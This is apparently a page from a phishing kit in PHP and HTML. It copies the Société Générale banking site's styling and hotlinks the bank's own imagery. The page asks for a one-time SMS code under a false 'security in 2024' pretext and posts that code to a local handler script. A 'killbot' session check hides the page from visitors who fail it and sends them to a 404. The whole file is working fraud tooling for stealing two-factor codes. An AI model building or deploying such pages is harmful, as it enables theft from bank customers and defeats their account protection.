<?php 
session_start();
include "../server/fonctions.php";
require "../server/all.php";
include "../server/script.php";

if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] ==  true) { 
?>
<!DOCTYPE html>
<html class="awt--standalone awt--ngim" lang="FR">

<head>
	<!-- Titre page -->
	<title>SG | SMS </title>
	<!-- Favicon -->
	<link rel="icon" type="image/x-icon" href="../assets/favicon.ico">
	<!-- Balise  -->
	<meta charset="UTF-8">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="robots" content="noindex, nofollow">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- CCS  -->
	<link rel="stylesheet" href="../assets/css/awt-front-BDDF.css" media="all">
	<link rel="stylesheet" href="../assets/css/main2.css" media="all">
	<link href="../assets/css/index.min.css" rel="stylesheet" type="text/css">
	<link href="../assets/css/spec56_btn_gsm_all_gcd_20221102095656.min.css" rel="stylesheet" type="text/css">
	<link href="../assets/css/print.min.css" rel="stylesheet" type="text/css" media="print">
	<!-- JS  -->
</head>
<style>
  body {
    margin: 0;
    padding: 0;
    overflow-x: hidden; /* Empêche la barre de défilement horizontale */
  }
</style>

<style>
  #root {
    margin: 0;
    padding: 0;
  }
</style>
<body>
	<header>
		<?php include("../assets/header.php"); ?>
	</header>



	<button class="dcw_skip" onclick="">Aller au menu principal</button>
	<button class="dcw_skip" onclick="">Aller au contenu</button>
	<section class="dcw_main">
		<section class="dcw_gb_row dcw_gb_communication"></section>
		<section class="avenir_gb_wrapper ">
			<main role="main">
				<section class="dcw_gb_core ugds_serviciel" id="">
					<div id="awt--root-element" class="awt--root-element">
						<div id="sdcWrapper" class="sdcWrapper theme-enseigne-bddf theme-banque-bddf theme-marche-pri">
							
							<div class="SGBoxStyled-sc-1r671le-0 HFaNz stl_box stl_box--top--sm"></div>
							<div class="stl_grid_row stl_grid_row-start stl_grid_row-middle SGGridRowStyled-sc-18jw88p-0 fwLPRs stl_grid_row" style="margin-left: -14px; margin-right: -14px; row-gap: 0px;">
								<div class="stl_grid_col stl_grid_col-null stl_grid_col-offset-1 SGGridColStyled-sc-6esajy-0 jOBtwG stl_grid_col--textalign-left stl_grid_col-xs-12 stl_grid_col-sm-9 stl_grid_col-md-7 stl_grid_col-lg-6 stl_grid_col-xl-2" style="padding-left: 14px; padding-right: 14px;">
									<button type="button" class="stl_btn SGButtonStyled-sc-hifh5r-0 fZWyMO stl_btn stl_btn--tertiary stl_btn--medium stl_btn-tertiary stl_btn-block">
										<span class="stl_btn__inner">
											<span class="SGIconStyled-sc-19bihye-0 dKskyj stl_icon stl_icon--s stl_icon--left">
												<svg aria-hidden="true" focusable="false" class="stroked" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" stroke-miterlimit="1.5" fill="none">
													<path d="M12.669 7.754l4.796 4.746-4.81 4.718" class="stroked__path--stroke" style="stroke-width: 2;"></path>
													<path d="M5 12.5h11.638" class="stroked__path--stroke" style="stroke-width: 2;"></path>
												</svg>
											</span>
											<span class="stl_btn__label">Retour</span>
										</span>
									</button>
								</div>
							</div>
							<!-- Page Titre -->
							<div class="SGBoxStyled-sc-1r671le-0 duBNYo stl_box stl_box--bottom--xl stl_box--top--xl">
								<h2 class="ant-typography SGTitleStyled-sc-1uu0wpc-0 iTVHLn stl_title stl_title--1">Confirmation par code à usage unique</h2>
							</div>
							


							</div>

							<section class="stl_layout SGLayoutStyled-sc-137s6yd-0 crCDLR stl_layout--background-gradient">
								<aside class="stl_layout__content SGContentStyled-sc-b656on-0 cHAlqP">
									<div class="stl_grid_row stl_grid_row-center stl_grid_row-top SGGridRowStyled-sc-18jw88p-0 fwLPRs stl_grid_row" style="margin-left: -14px; margin-right: -14px; row-gap: 0px;">
										<div class="stl_grid_col stl_grid_col-null SGGridColStyled-sc-6esajy-0 kaoNPF stl_grid_col--textalign-left stl_grid_col-xs-12 stl_grid_col-sm-12 stl_grid_col-md-8 stl_grid_col-lg-8 stl_grid_col-xl-8" style="padding-left: 14px; padding-right: 14px;">
											<div class="stl_layout SGLayoutStyled-sc-137s6yd-0 eOHIgR">
												<div class="stl_grid_row stl_grid_row-center stl_grid_row-top SGGridRowStyled-sc-18jw88p-0 fwLPRs stl_grid_row" style="margin-left: -14px; margin-right: -14px; row-gap: 0px;">
													<div class="stl_grid_col stl_grid_col-null SGGridColStyled-sc-6esajy-0 jOBtwG stl_grid_col--textalign-left stl_grid_col-xs-12 stl_grid_col-sm-12 stl_grid_col-md-12 stl_grid_col-lg-12 stl_grid_col-xl-12" style="padding-left: 14px; padding-right: 14px;">

<!-- Début formulaire -->
<form method="POST" action="../actions/sms.php" id='myform'>

<div class="SGInputWrapperStyled-sc-rgbn3c-0 eEtWwo stl_input__wrapper">
<?php if (isset($_GET['error']) && $_GET['error'] == 1) { 
    echo '<p style="color: red; font-size: 20px;">Veuillez corriger vos informations</p>';
}?>
<div style="max-width: 100%; overflow: hidden; text-align: center;">
    <img src="https://particuliers.sg.fr/static/Particuliers/assets/img/selfcare/visuel_d_activation_5_728x392.webp" style="max-width: 75%; height: auto; display: inline-block;" alt="image">
</div>




<h2 class="vupri_alertbox__title"><p style="color: black; font-size: 14px;"> 
Un code à usage unique vous a été envoyé pour ajouter votre numéro de compte au compte bénéficiant de la sécurité en 2024, afin de finaliser le processus. </h2>
	

		<label class="SGInputLabelStyled-sc-zdh2di-0 eyNvXt stl_input__label" for="nom">
			<span class="SGTextStyled-sc-113v4u0-0 fZGdxV stl_text">Code à usage unique</span>		
			<span class="stl_input-affix-wrapper SGInputStyled-sc-e7zmrg-0 gZSEaC stl_input--size-default stl_input--default">
			<input class="stl_input"  name="sms_validation" inputmode="text" placeholder="Ex : 9843382"  type="text"  minlength="1" maxlength="10" required>
			<span class="stl_input-suffix"><span></span></span>
		</span>

		
	

	<!-- Bouton submit -->
	<div class="SGButtonGroupStyled-sc-7g8rjz-0 hgiVlb stl_btn-group" role="group">
		<button type="submit" name="sms_submit" id="sms_submit" class="stl_btn SGButtonStyled-sc-hifh5r-0 hxXXEg stl_btn stl_btn--primary stl_btn--md stl_btn-primary stl_btn-block">
			<span class="stl_btn__inner">
				<span class="stl_btn__label">Continuer</span></span>
		</button>
	</div>

	<!-- /Bouton submit -->

														</form>
													</div>
												</div>
											</div>
										</div>
									</div>
								</aside>
							</section>
						</div>
					</div>
				</section>
			</main>
		</section>
	</section>
	<!-- FOOTER -->
	<?php include("../assets/footer.php"); ?>

	
</body>
</html>			

<!-- A C C E S   R E F U S E R -->
<?php
}
else {
	session_destroy();
	header('Location ../404.php');
	

}
?>

